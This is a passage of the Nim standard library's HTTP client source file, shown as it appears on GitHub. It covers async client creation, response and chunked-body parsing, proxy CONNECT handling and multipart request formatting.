proc newAsyncHttpClient\*(userAgent = defUserAgent, maxRedirects = 5, sslContext = getDefaultSSL(), proxy: Proxy = nil, headers = newHttpHeaders()): AsyncHttpClient = ## Creates a new AsyncHttpClient instance. ## ## ``userAgent`` specifies the user agent that will be used when making ## requests. ## ## ``maxRedirects`` specifies the maximum amount of redirects to follow, ## default is 5. ## ## ``sslContext`` specifies the SSL context to use for HTTPS requests. ## ## ``proxy`` specifies an HTTP proxy to use for this HTTP client's ## connections. ## ## ``headers`` specifies the HTTP Headers. new result result.headers = headers result.userAgent = userAgent result.maxRedirects = maxRedirects result.proxy = proxy result.timeout = -1 # TODO result.onProgressChanged = nil result.bodyStream = newFutureStream[string]("newAsyncHttpClient") result.getBody = true when defined(ssl): result.sslContext = sslContext
proc close\*(client: HttpClient | AsyncHttpClient) = ## Closes any connections held by the HTTP client. if client.connected: client.socket.close() client.connected = false
proc getSocket\*(client: HttpClient): Socket = ## Get network socket, useful if you want to find out more details about the connection ## ## this example shows info about local and remote endpoints ## ## .. code-block:: Nim ## if client.connected: ## echo client.getSocket.getLocalAddr ## echo client.getSocket.getPeerAddr ## return client.socket
proc getSocket\*(client: AsyncHttpClient): AsyncSocket = return client.socket
proc reportProgress(client: HttpClient | AsyncHttpClient, progress: BiggestInt) {.multisync.} = client.contentProgress += progress client.oneSecondProgress += progress if (getMonoTime() - client.lastProgressReport).inSeconds > 1: if not client.onProgressChanged.isNil: await client.onProgressChanged(client.contentTotal, client.contentProgress, client.oneSecondProgress) client.oneSecondProgress = 0 client.lastProgressReport = getMonoTime()
proc recvFull(client: HttpClient | AsyncHttpClient, size: int, timeout: int, keep: bool): Future[int] {.multisync.} = ## Ensures that all the data requested is read and returned. var readLen = 0 while true: if size == readLen: break
 let remainingSize = size - readLen let sizeToRecv = min(remainingSize, net.BufferSize)
 when client.socket is Socket: let data = client.socket.recv(sizeToRecv, timeout) else: let data = await client.socket.recv(sizeToRecv) if data == "": client.close() break # We've been disconnected.
 readLen.inc(data.len) if keep: await client.bodyStream.write(data)
 await reportProgress(client, data.len)
 return readLen
proc parseChunks(client: HttpClient | AsyncHttpClient): Future[void] {.multisync.} = while true: var chunkSize = 0 var chunkSizeStr = (await client.socket.recvLine()).string var i = 0 if chunkSizeStr == "": httpError("Server terminated connection prematurely") while i < chunkSizeStr.len: case chunkSizeStr[i] of '0'..'9': chunkSize = chunkSize shl 4 or (ord(chunkSizeStr[i]) - ord('0')) of 'a'..'f': chunkSize = chunkSize shl 4 or (ord(chunkSizeStr[i]) - ord('a') + 10) of 'A'..'F': chunkSize = chunkSize shl 4 or (ord(chunkSizeStr[i]) - ord('A') + 10) of ';': # http://tools.ietf.org/html/rfc2616#section-3.6.1 # We don't care about chunk-extensions. break else: httpError("Invalid chunk size: " & chunkSizeStr) inc(i) if chunkSize <= 0: discard await recvFull(client, 2, client.timeout, false) # Skip \c\L break var bytesRead = await recvFull(client, chunkSize, client.timeout, true) if bytesRead != chunkSize: httpError("Server terminated connection prematurely")
 bytesRead = await recvFull(client, 2, client.timeout, false) # Skip \c\L if bytesRead != 2: httpError("Server terminated connection prematurely")
 # Trailer headers will only be sent if the request specifies that we want # them: http://tools.ietf.org/html/rfc2616#section-3.6.1
proc parseBody(client: HttpClient | AsyncHttpClient, headers: HttpHeaders, httpVersion: string): Future[void] {.multisync.} = # Reset progress from previous requests. client.contentTotal = 0 client.contentProgress = 0 client.oneSecondProgress = 0 client.lastProgressReport = MonoTime()
 when client is AsyncHttpClient: assert(not client.bodyStream.finished)
 if headers.getOrDefault"Transfer-Encoding" == "chunked": await parseChunks(client) else: # -REGION- Content-Length # (http://tools.ietf.org/html/rfc2616#section-4.4) NR.3 var contentLengthHeader = headers.getOrDefault"Content-Length" if contentLengthHeader != "": var length = contentLengthHeader.parseInt() client.contentTotal = length if length > 0: let recvLen = await client.recvFull(length, client.timeout, true) if recvLen == 0: client.close() httpError("Got disconnected while trying to read body.") if recvLen != length: httpError("Received length doesn't match expected length. Wanted " & $length & " got " & $recvLen) else: # (http://tools.ietf.org/html/rfc2616#section-4.4) NR.4 TODO
 # -REGION- Connection: Close # (http://tools.ietf.org/html/rfc2616#section-4.4) NR.5 let implicitConnectionClose = httpVersion == "1.0" or # This doesn't match the HTTP spec, but it fixes issues for non-conforming servers. (httpVersion == "1.1" and headers.getOrDefault"Connection" == "") if headers.getOrDefault"Connection" == "close" or implicitConnectionClose: while true: let recvLen = await client.recvFull(4000, client.timeout, true) if recvLen != 4000: client.close() break
 when client is AsyncHttpClient: client.bodyStream.complete() else: client.bodyStream.setPosition(0)
 # If the server will close our connection, then no matter the method of # reading the body, we need to close our socket. if headers.getOrDefault"Connection" == "close": client.close()
proc parseResponse(client: HttpClient | AsyncHttpClient, getBody: bool): Future[Response | AsyncResponse] {.multisync.} = new result var parsedStatus = false var linei = 0 var fullyRead = false var line = "" result.headers = newHttpHeaders() while true: linei = 0 when client is HttpClient: line = (await client.socket.recvLine(client.timeout)).string else: line = (await client.socket.recvLine()).string if line == "": # We've been disconnected. client.close() break if line == httpNewLine: fullyRead = true break if not parsedStatus: # Parse HTTP version info and status code. var le = skipIgnoreCase(line, "HTTP/", linei) if le <= 0: httpError("invalid http version, `" & line & "`") inc(linei, le) le = skipIgnoreCase(line, "1.1", linei) if le > 0: result.version = "1.1" else: le = skipIgnoreCase(line, "1.0", linei) if le <= 0: httpError("unsupported http version") result.version = "1.0" inc(linei, le) # Status code linei.inc skipWhitespace(line, linei) result.status = line[linei .. ^1] parsedStatus = true else: # Parse headers var name = "" var le = parseUntil(line, name, ':', linei) if le <= 0: httpError("invalid headers") inc(linei, le) if line[linei] != ':': httpError("invalid headers") inc(linei) # Skip :
 result.headers.add(name, line[linei .. ^1].strip()) if result.headers.len > headerLimit: httpError("too many headers")
 if not fullyRead: httpError("Connection was closed before full request has been made")
 if getBody and result.code != Http204: when client is HttpClient: client.bodyStream = newStringStream() result.bodyStream = client.bodyStream parseBody(client, result.headers, result.version) else: client.bodyStream = newFutureStream[string]("parseResponse") result.bodyStream = client.bodyStream assert(client.parseBodyFut.isNil or client.parseBodyFut.finished) client.parseBodyFut = parseBody(client, result.headers, result.version) # do not wait here for the body request to complete
proc newConnection(client: HttpClient | AsyncHttpClient, url: Uri) {.multisync.} = if client.currentURL.hostname != url.hostname or client.currentURL.scheme != url.scheme or client.currentURL.port != url.port or (not client.connected): # Connect to proxy if specified let connectionUrl = if client.proxy.isNil: url else: client.proxy.url
 let isSsl = connectionUrl.scheme.toLowerAscii() == "https"
 if isSsl and not defined(ssl): raise newException(HttpRequestError, "SSL support is not available. Cannot connect over SSL. Compile with -d:ssl to enable.")
 if client.connected: client.close() client.connected = false
 # TODO: I should be able to write 'net.Port' here... let port = if connectionUrl.port == "": if isSsl: nativesockets.Port(443) else: nativesockets.Port(80) else: nativesockets.Port(connectionUrl.port.parseInt)
 when client is HttpClient: client.socket = await net.dial(connectionUrl.hostname, port) elif client is AsyncHttpClient: client.socket = await asyncnet.dial(connectionUrl.hostname, port) else: {.fatal: "Unsupported client type".}
 when defined(ssl): if isSsl: try: client.sslContext.wrapConnectedSocket( client.socket, handshakeAsClient, connectionUrl.hostname) except: client.socket.close() raise getCurrentException()
 # If need to CONNECT through proxy if url.scheme == "https" and not client.proxy.isNil: when defined(ssl): # Pass only host:port for CONNECT var connectUrl = initUri() connectUrl.hostname = url.hostname connectUrl.port = if url.port != "": url.port else: "443"
 let proxyHeaderString = generateHeaders(connectUrl, $HttpConnect, newHttpHeaders(), client.proxy) await client.socket.send(proxyHeaderString) let proxyResp = await parseResponse(client, false)
 if not proxyResp.status.startsWith("200"): raise newException(HttpRequestError, "The proxy server rejected a CONNECT request, " & "so a secure connection could not be established.") client.sslContext.wrapConnectedSocket( client.socket, handshakeAsClient, url.hostname) else: raise newException(HttpRequestError, "SSL support is not available. Cannot connect over SSL. Compile with -d:ssl to enable.")
 # May be connected through proxy but remember actual URL being accessed client.currentURL = url client.connected = true
proc readFileSizes(client: HttpClient | AsyncHttpClient, multipart: MultipartData) {.multisync.} = for entry in multipart.content.mitems(): if not entry.isFile: continue if not entry.isStream: entry.fileSize = entry.content.len continue
 # TODO: look into making getFileSize work with async let fileSize = getFileSize(entry.content) entry.fileSize = fileSize
proc format(entry: MultipartEntry, boundary: string): string = result = "--" & boundary & httpNewLine result.add("Content-Disposition: form-data; name=\"" & entry.name & "\"") if entry.isFile: result.add("; filename=\"" & entry.filename & "\"" & httpNewLine) result.add("Content-Type: " & entry.contentType & httpNewLine) else: result.add(httpNewLine & httpNewLine & entry.content)
proc format(client: HttpClient | AsyncHttpClient, multipart: MultipartData): Future[seq[string]] {.multisync.} = let bound = getBoundary(multipart) client.headers["Content-Type"] = "multipart/form-data; boundary=" & bound
 await client.readFileSizes(multipart)
 var length: int64 for entry in multipart.content: result.add(format(entry, bound) & httpNewLine) if entry.isFile: length += entry.fileSize + httpNewLine.len
 result.add "--" & bound & "--"
 for s in result: length += s.len client.headers["Content-Length"] = $length
proc override(fallback, override: HttpHeaders): HttpHeaders = # Right-biased map union for `HttpHeaders` if override.isNil: return fallback
 result = newHttpHeaders() # Copy by value result.table[] = fallback.table[] for k, vs in override.table: result[k] = vs
proc requestAux(client: HttpClient | AsyncHttpClient, url, httpMethod: string, body = "", headers: HttpHeaders = nil, multipart: MultipartData = nil): Future[Response | AsyncResponse] {.multisync.} = # Helper that actually makes the request. Does not handle redirects. let requestUrl = parseUri(url)
 if requestUrl.scheme == "": raise newException(ValueError, "No uri scheme supplied.")
 var data: seq[string] if multipart != nil and multipart.content.len > 0: data = await client.format(multipart) else: client.headers["Content-Length"] = $body.len
 when client is AsyncHttpClient: if not client.parseBodyFut.isNil: # let the current operation finish before making another request await client.parseBodyFut client.parseBodyFut = nil
 await newConnection(client, requestUrl)
 let newHeaders = client.headers.override(headers) if not newHeaders.hasKey("user-agent") and client.userAgent.len > 0: newHeaders["User-Agent"] = client.userAgent
 let headerString = generateHeaders(requestUrl, httpMethod, newHeaders, client.proxy) await client.socket.send(headerString)
[View remainder of file in raw view](https://github.com/nim-lang/Nim/raw/dc5a40f3f39c6ea672e6dc6aca7f8118a69dda99/lib/pure/httpclient.nim)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


